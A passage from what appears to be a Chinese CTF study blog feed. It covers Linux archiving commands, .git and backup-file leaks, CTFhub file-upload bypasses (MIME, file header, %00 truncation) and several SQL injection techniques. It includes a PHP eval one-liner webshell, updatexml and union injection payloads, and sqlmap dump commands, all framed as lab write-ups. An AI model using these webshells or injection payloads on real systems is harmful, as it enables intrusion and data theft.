[文件…]</p><p>说明：gzip压缩会产生后缀为“.gz”的压缩文件，并删除原始文件</p><p>常用选项：</p><p>-c：压缩后文件输出到标准输出设备，不改变原始文件</p><p>-d：解开压缩文件</p><p>-f：强行压缩文件</p><p>-n：压缩文件时，不保存原来的文件名称及时间戳记</p><p>-N：压缩文件时，保存原来的文件名称及时间戳记</p><p>-r：递归处理，将指定目录下的所有文件及子目录一并处理</p><h3 id="zip压缩命令"><a href="#zip压缩命令" class="headerlink" title="zip压缩命令"></a>zip压缩命令</h3><p>压缩文件</p><p>​     zip test.zip linked.h linked.c</p><p>解压文件</p><p>​    unzip test.zip</p><h3 id="tar（tape-archive）命令"><a href="#tar（tape-archive）命令" class="headerlink" title="tar（tape archive）命令"></a>tar（tape archive）命令</h3><p>格式：tar [选项…] [文件或目录]…</p><p>说明：tar是用来建立、还原文件的工具程序，它可以加入、解开备份文件内的文件</p><p>常用选项：</p><p>-A:新增tar文件到已存在的备份文件</p><p>-c:建立新的备份文件 -f备份文件&gt;：列出备份文件的内容</p><p>-v:显示指令执行过程</p><p>-x:从备份文件中还原文件</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux命令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息泄露</title>
    <link href="/2025/04/06/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/04/06/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="git"><a href="#git" class="headerlink" title=".git"></a>.git</h2><p><code>.git</code>是 Git 版本控制系统使用的隐藏文件夹，它包含了项目的完整版本历史记录、提交记录、分支信息等</p><p>一定要在GitHack目录下</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">python2 GitHack.<span class="hljs-keyword">py</span> http://challenge-efb678740fb6553d.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/.git<br></code></pre></td></tr></table></figure><h2 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h2><h3 id="index-php-swp"><a href="#index-php-swp" class="headerlink" title="index.php.swp"></a>index.php.swp</h3><p><code>.swp</code> 文件是 Vim 编辑器在编辑文件时生成的****临时文件****，用于保存编辑过程中的中间状态。</p><p>如果编辑过程中 Vim 意外退出（如由于网络中断、服务器重启等原因），<code>.swp</code> 文件可能会保留下来。</p><p>如果这个文件被部署到生产环境中，并且包含了敏感信息（如数据库密码、API 密钥等），就可能导致信息泄露。</p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php~"></a><strong><code>index.php~</code></strong></h3><p><code>index.php~</code> 文件通常是某些文本编辑器（如 nano 或某些版本的 vi&#x2F;vim）在编辑文件时生成的临时备份文件。这些文件通常用于在编辑器意外退出或崩溃时恢复未保存的更改。然而，如果这些临时文件被意外地保留在公开可访问的服务器上，就可能导致信息泄露，尤其是当它们包含敏感信息时。</p><h3 id="index-php-bak"><a href="#index-php-bak" class="headerlink" title="index.php.bak"></a><code>index.php.bak</code></h3><p><code>.bak</code> 文件通常是文件的****备份版本****，可能是在编辑或更新文件时由编辑器或开发人员自动生成的。</p><p>如果这些备份文件包含了敏感信息，并且被部署到生产环境中，同样可能导致信息泄露。</p><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a><strong>robots.txt</strong></h3><p><code>robots.txt</code> 是一个放置在网站根目录下的文本文件，用于告诉搜索引擎爬虫（也称为机器人或蜘蛛）哪些页面可以抓取，哪些页面不能抓取。这是网站管理员控制搜索引擎抓取行为的一种标准方式。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFhub前端验证 MIME绕过</title>
    <link href="/2025/03/18/CTFhub%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81-MIME%E7%BB%95%E8%BF%87/"/>
    <url>/2025/03/18/CTFhub%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81-MIME%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFhub前端验证-MIME绕过"><a href="#CTFhub前端验证-MIME绕过" class="headerlink" title="CTFhub前端验证 MIME绕过"></a>CTFhub前端验证 MIME绕过</h1><h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><p>前端验证是在用户提交数据之前，在<strong>浏览器端</strong>检查输入数据是否符合要求</p><p>题目有限制只能上传特定后缀，所以我们在直接修改一句话木马的后缀为png，上传后bp抓包再改为php。这样就饶过了前端验证但是php依旧能在服务器端执行。</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-41-57.png" alt="PixPin_2025-03-17_16-41-57"></p><p>上传成功，获得文件上传路径</p><p>然后就是连接蚁剑<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-39-17.png" alt="PixPin_2025-03-17_16-39-17"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-39-45.png" alt="PixPin_2025-03-17_16-39-45"></p><h2 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h2><p>什么是 MIME 类型？</p><p>MIME是一种 标识文件类型的方式</p><p>当上传文件时，浏览器会向服务器发送 文件的 MIME 类型，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Type: image/png<br></code></pre></td></tr></table></figure><p>这样，服务器就能知道 上传的是 PNG 图片。</p><p>MIME 绕过的核心原理</p><p><strong>正常的文件上传逻辑</strong></p><ol><li><p><strong>前端检查 MIME 类型</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">javascript复制编辑<span class="hljs-keyword">if</span>(file.<span class="hljs-keyword">type</span> <span class="hljs-type">!== </span><span class="hljs-string">&quot;image/png&quot;</span>) &#123;<br>    alert(<span class="hljs-string">&quot;只允许上传 PNG 图片！&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>绕过方式</strong>：修改 <code>file.type</code>，或直接禁用 JS 校验。</p></li><li><p><strong>后端检查 MIME 类型</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] !== <span class="hljs-string">&quot;image/png&quot;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;上传的文件类型不正确！&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>绕过方式</strong>：</p><ul><li><strong>修改请求头的 <code>Content-Type</code></strong></li><li><strong>伪造文件扩展名</strong></li><li><strong>利用 PHP 解析漏洞</strong></li><li><strong>双扩展名绕过</strong></li></ul></li></ol><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-45-52.png" alt="PixPin_2025-03-17_16-45-52"></p><p>这里我们直接更改Content-Type。然后连接蚁剑。</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-47-18.png" alt="PixPin_2025-03-17_16-47-18"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-47-35.png" alt="PixPin_2025-03-17_16-47-35"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>实操</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>Ctfhub</tag>
      
      <tag>前端验证</tag>
      
      <tag>MIME绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFhub文件头检查 00截断</title>
    <link href="/2025/03/18/CTFhub%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5-00%E6%88%AA%E6%96%AD/"/>
    <url>/2025/03/18/CTFhub%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5-00%E6%88%AA%E6%96%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFhub文件头检查-00截断"><a href="#CTFhub文件头检查-00截断" class="headerlink" title="CTFhub文件头检查 00截断"></a>CTFhub文件头检查 00截断</h1><h2 id="文件头检查绕过原理及方法"><a href="#文件头检查绕过原理及方法" class="headerlink" title="文件头检查绕过原理及方法"></a>文件头检查绕过原理及方法</h2><p>所有的文件都是以二进制的形式进行存储的，本质上没有差别。在每一个文件的开头实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。</p><p>常见的文件头：<br>注意：下面的文件头的格式是16进制的格式：</p><p>GIF：47 49 46 38 39 61<br>png：89 50 4E 47 0D 0A 1A 0A<br>JPG：FF D8 FF E0 00 10 4A 46 49 46</p><p>文件头检查绕过方法：</p><p>第一种： <strong>把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。</strong></p><p>方法在：<a href="https://blog.csdn.net/weixin_45588247/article/details/119592213">【文件上传绕过】——后端检测_文件头检测漏洞_【中核检测】【文件】-CSDN博客</a></p><p>第二种：随便找一张图片，用记事本打开然后在后面拼接一句话木马。</p><p>但是这张图片要尽量小一点，不知道为什么同样的操作，比较大的图片一直成功不了。</p><h2 id="文件头检查wp"><a href="#文件头检查wp" class="headerlink" title="文件头检查wp"></a>文件头检查wp</h2><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_17-08-44.png" alt="PixPin_2025-03-17_17-08-44"></p><p>拼接</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_17-11-42.png" alt="PixPin_2025-03-17_17-11-42"></p><p>用010查看可以发现拼接成功了</p><p><img src="E:\temp\PixPin_2025-03-17_17-12-58.png" alt="PixPin_2025-03-17_17-12-58"></p><p>然后更改后缀，之后的步骤都一样</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_17-13-44.png" alt="PixPin_2025-03-17_17-13-44"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_17-14-08.png" alt="PixPin_2025-03-17_17-14-08"></p><h2 id="00截断原理"><a href="#00截断原理" class="headerlink" title="00截断原理"></a>00截断原理</h2><p>在PHP 5.2版本中，存在一个严重的漏洞，即<strong>00截断漏洞</strong>。该漏洞允许恶意用户通过URL参数输入*%00*，导致后续字符被自动忽略，从而绕过文件类型的限制。</p><p>漏洞示例</p><p>例如，假设我们有一个文件上传功能，要求上传的文件必须是*.jpg<em>格式。攻击者可以上传一个名为</em>shell.php%00.jpg<em>的文件。由于</em>%00<em>在URL编码中表示ASCII码中的空字符（NULL字符），PHP在处理文件名时会将其视为字符串的结束符，从而忽略后面的</em>.jpg*</p><p>&#x2F;&#x2F; 上传的文件名为 shell.php%00.jpg</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;shell.php%00.jpg&quot;</span>;<br><br><span class="hljs-regexp">//</span> <span class="hljs-variable constant_">PHP</span> <span class="hljs-number">5.2</span> 解析时会将其视为 shell.php<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$filename</span>; <span class="hljs-regexp">//</span> 实际包含的是 shell.php<br></code></pre></td></tr></table></figure><p>在上述代码中，PHP会将*$filename<em>解析为</em>shell.php*，从而执行PHP代码，而不是将其视为一个图片文件</p><h2 id="00截断wp"><a href="#00截断wp" class="headerlink" title="00截断wp"></a>00截断wp</h2><p>上传图片码成功</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-18_20-58-01.png" alt="PixPin_2025-03-18_20-58-01"></p><p>文件上传成功后只执行了 JavaScript 弹窗 (<code>alert()</code>)，但并没有 <code>echo</code> 文件的完整路径，因此浏览器端不会直接看到文件的存储路径</p><p>我们直接在蚁剑连接后面添加&#x2F;upload&#x2F;3.php（理想中的文件上传路径）连接失败</p><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_18-25-21.png" alt="PixPin_2025-03-17_18-25-21"></p><p><a href="https://blog.csdn.net/Mitchell_Donovan/article/details/115918878">【CTFHub】文件上传漏洞_00截断_ctfhub00截断-CSDN博客</a></p><p><strong>rand()函数显然是生成了随机数，对文件上传的路径进行了拼接</strong></p><p><strong>所以我们在成功上传后还是找不到文件路径已经不是3.php(3.php%00.png)，依旧无法连接</strong></p><p>思路就是用00截断字符把随机数给截断掉，</p><p><img src="E:\temp\PixPin_2025-03-18_21-07-52.png" alt="PixPin_2025-03-18_21-07-52"></p><p>用用蚁剑连接这个webshell</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_18-34-02.png" alt="PixPin_2025-03-17_18-34-02"></p><p>（用的第一次做的截图所以显示是2.php）</p><p>找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_18-34-23.png" alt="PixPin_2025-03-17_18-34-23"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>基础知识</category>
      
      <category>实操</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>00截断</tag>
      
      <tag>CTFhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFhub 文件上传无限制</title>
    <link href="/2025/03/18/CTFhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%97%A0%E9%99%90%E5%88%B6/"/>
    <url>/2025/03/18/CTFhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%97%A0%E9%99%90%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFhub-文件上传无限制"><a href="#CTFhub-文件上传无限制" class="headerlink" title="CTFhub 文件上传无限制"></a>CTFhub 文件上传无限制</h1><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-29-19.png" alt="PixPin_2025-03-17_16-29-19"></p><p>直接上传一句话木马php文件实现任意文件读取</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-18_19-05-21.png" alt="PixPin_2025-03-18_19-05-21"></p><!--我的理解是上传一句话木马后，网站的php源码会新增一个参数，然后我们可以利用这个参数传恶意参数实现任意文件读取--><!--为什么传<?php @eval($_POST['1']);?>可以被网站解析执行并添加这么一个参数：--><!--PHP 代码在 **服务器端** 运行，而不是在客户端（浏览器）执行。--> <!--当访问一个 PHP 文件时，服务器会：--><ul><li><!--读取 PHP 文件的内容--></li><li><!--交给 PHP 解析器解析--></li><li><!--运行代码，返回结果给用户--></li></ul><!--所以，一旦你上传了 `<?php @eval($_POST['1']); ?>`，它就会被 **服务器执行**，并不会当作普通文本对待。--><p>蚁剑连接 查看目录</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-31-21.png" alt="PixPin_2025-03-17_16-31-21"></p><p>找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-32-26.png" alt="PixPin_2025-03-17_16-32-26"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>实操</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些SQL注入文件上传RCE</title>
    <link href="/2025/03/16/%E4%B8%80%E4%BA%9BSQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE/"/>
    <url>/2025/03/16/%E4%B8%80%E4%BA%9BSQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFhub-NSSCTF"><a href="#CTFhub-NSSCTF" class="headerlink" title="CTFhub+NSSCTF"></a>CTFhub+NSSCTF</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="整数型"><a href="#整数型" class="headerlink" title="整数型"></a>整数型</h3><p> 查询列数-order by 语句  要注意的是联合查询前后两条 select 语句查询数据的列数是相等的，故需要使用 order by 语句来判断注 入点sql语句查询的列数是多少</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-23-40.png" alt="PixPin_2025-03-06_19-23-40"></p><p>UNION 联合查询数据库信息：确认完显示位可以利用显示位查询当前数据库名：回显为sqli</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-25-23.png" alt="PixPin_2025-03-06_19-25-23"></p><p>关于将id值设置为0或者负数的解释;</p><p>由于我们的语句是插入到原有语句后面，这样就会出现两个SQL语句同时执行，由于SQL查询默认返回一 行数据，所以我们插入的第二行语句的结果就不会被返回，只会返回原有的SQL语句的查询内容。 要让数据库查询我们插入的语句，需要让原有SQL语句查询为空。</p><p>接着查询表名</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-27-07.png" alt="PixPin_2025-03-06_19-27-07"></p><p>select group_concat(table_name) from information_schema.tables where  table_schema&#x3D;’sqli’; 加引号</p><p>查列名 </p><p>select group_concat(column_name) from information_schema.columns where  table_name&#x3D;’flag’ and table_schema&#x3D;’flag’;  加引号</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-28-38.png" alt="PixPin_2025-03-06_19-28-38"></p><p>查数据</p><p>select group_concat(username,0x3a,password) from security.users;  不加引号</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-36-26.png" alt="PixPin_2025-03-06_19-36-26"></p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>区别不大，需要先判断闭合符号</p><p>常见的有  </p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&quot;</span><br>()<br></code></pre></td></tr></table></figure><p>输入常用闭合符号使页面抛出sql语法错误的报错信息，根据报错信息可以<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-39-03.png" alt="PixPin_2025-03-06_19-39-03"></p><p>发现闭合符号</p><p>然后重复以上步骤</p><p>查库名</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-40-01.png" alt="PixPin_2025-03-06_19-40-01"></p><p>查表名<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-41-10.png" alt="PixPin_2025-03-06_19-41-10"></p><p>查数据 得到flag<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-43-41.png" alt="PixPin_2025-03-06_19-43-41"></p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-17-29.png" alt="PixPin_2025-03-06_20-17-29"></p><p>在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页 面能够抛出报错的代码信息，就可以利用报错回显，来查看注入的sql语句的执行结果</p><p><code>updatexml</code> 是 SQL 中的一个函数，主要用于处理和查询 XML 数据。它通常用于 MySQL 数据库，但它在安全方面也很敏感，尤其是在 SQL 注入攻击中被广泛利用。</p><hr><h3 id="📘-基本语法："><a href="#📘-基本语法：" class="headerlink" title="📘 基本语法："></a>📘 <strong>基本语法：</strong></h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sql<br><br><br><br><span class="hljs-function"><span class="hljs-title">UPDATEXML</span><span class="hljs-params">(xml_target, xpath_expr, new_value)</span></span><br></code></pre></td></tr></table></figure><ul><li>**<code>xml_target</code>**：要操作的 XML 数据。</li><li>**<code>xpath_expr</code>**：XPath 表达式，用于定位 XML 节点。</li><li>**<code>new_value</code>**：替换的值。</li></ul><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">sql</span><br><br><br>复制编辑<br><span class="hljs-keyword">SELECT</span> UPDATEXML(<span class="hljs-string">&#x27;&lt;root&gt;&lt;name&gt;John&lt;/name&gt;&lt;/root&gt;&#x27;</span>, <span class="hljs-string">&#x27;/root/name&#x27;</span>, <span class="hljs-string">&#x27;Jane&#x27;</span>);<br></code></pre></td></tr></table></figure><p>🔸 <strong>结果</strong>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">xml<br><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Jane<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span>  <span class="hljs-title">user</span>()),0x7e),1))</span>; <br></code></pre></td></tr></table></figure><p>updatexml的第二个参数需要Xpath格式的字符串，是用&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，以~开头的内容不是 xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的 形式报出 该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-19-50.png" alt="PixPin_2025-03-06_20-19-50">+</p><p>借用updateexml函数查询库名 注意到数据末尾没有“~” 所以是没有显示完全的 改变substr后两个参数 得到全部库名</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-23-29.png" alt="PixPin_2025-03-06_20-23-29"></p><p>之后步骤一样</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-25-36.png" alt="PixPin_2025-03-06_20-25-36"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-27-07.png" alt="PixPin_2025-03-06_20-27-07"></p><p>得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-28-23.png" alt="PixPin_2025-03-06_20-28-23"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-29-35.png" alt="PixPin_2025-03-06_20-29-35"></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>先确定数据库名有几位，然后猜字母，用burp爆破</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-11-20.png" alt="PixPin_2025-03-07_20-11-20"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-13-21.png" alt="PixPin_2025-03-07_20-13-21"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-13-55.png" alt="PixPin_2025-03-07_20-13-55"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-29-08.png" alt="PixPin_2025-03-07_20-29-08"></p><p><img src="E:\temp\PixPin_2025-03-07_20-30-24.png" alt="PixPin_2025-03-07_20-30-24"></p><p><img src="E:\temp\PixPin_2025-03-07_20-34-16.png" alt="PixPin_2025-03-07_20-34-16"></p><p>但是太麻烦了于是转用sqlmap</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlmap -u xxx <span class="hljs-comment">--currernt-db</span><br></code></pre></td></tr></table></figure><p>又查库名</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-42-28.png" alt="PixPin_2025-03-07_20-42-28"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlmap -u xxx -D sqli <span class="hljs-comment">--tables</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-49-20.png" alt="PixPin_2025-03-07_20-49-20"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">sqlmap -u xxx -D sqli -<span class="hljs-built_in">T</span> flag --<span class="hljs-built_in">columns</span><br>sqlmap -u xxx -D sqli -<span class="hljs-built_in">T</span> flag --dump<br></code></pre></td></tr></table></figure><p>查到flag</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>延时注入是盲注的一种，在页面没有回显和报错，也不能通过拼接 and 0 、and 1 的布尔表达式来判断 sql语句是否成功执行，只能在参数后and sleep(5) ， 加上延时函数sleep()， 如果sql语句执行页面刷新 就会有一定的延时，根据页面是否有延时来判断sql语句执行与否所以叫做延时注入</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-20-08.png" alt="PixPin_2025-03-10_20-20-08"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-22-14.png" alt="PixPin_2025-03-10_20-22-14"></p><p>感觉是布尔盲注plus版 一个一个猜加个sleep判断对错<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-34-06.png" alt="PixPin_2025-03-10_20-34-06"></p><p>一样用burp爆破最后直接用了sqlmap</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-36-14.png" alt="PixPin_2025-03-10_20-36-14"></p><p>后面好像没截图</p><h3 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h3><p>直接用sqlmap</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-46-31.png" alt="PixPin_2025-03-10_20-46-31"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-57-18.png" alt="PixPin_2025-03-10_20-57-18"></p><p><img src="E:\temp\PixPin_2025-03-11_20-44-48.png" alt="PixPin_2025-03-11_20-44-48"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_20-45-17.png" alt="PixPin_2025-03-11_20-45-17"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_20-46-27.png" alt="PixPin_2025-03-11_20-46-27"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_20-48-00.png" alt="PixPin_2025-03-11_20-48-00"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_20-49-20.png" alt="PixPin_2025-03-11_20-49-20"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_20-49-42.png" alt="PixPin_2025-03-11_20-49-42"></p><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-13_20-53-33.png" alt="PixPin_2025-03-13_20-53-33"></h3><p>绕过空格的方法很多，但是这些都不行</p><p>最后是用的&#x2F;**&#x2F;</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-09-20.png" alt="PixPin_2025-03-11_21-09-20"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-12-02.png" alt="PixPin_2025-03-11_21-12-02"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-13-57.png" alt="PixPin_2025-03-11_21-13-57"></p><p><img 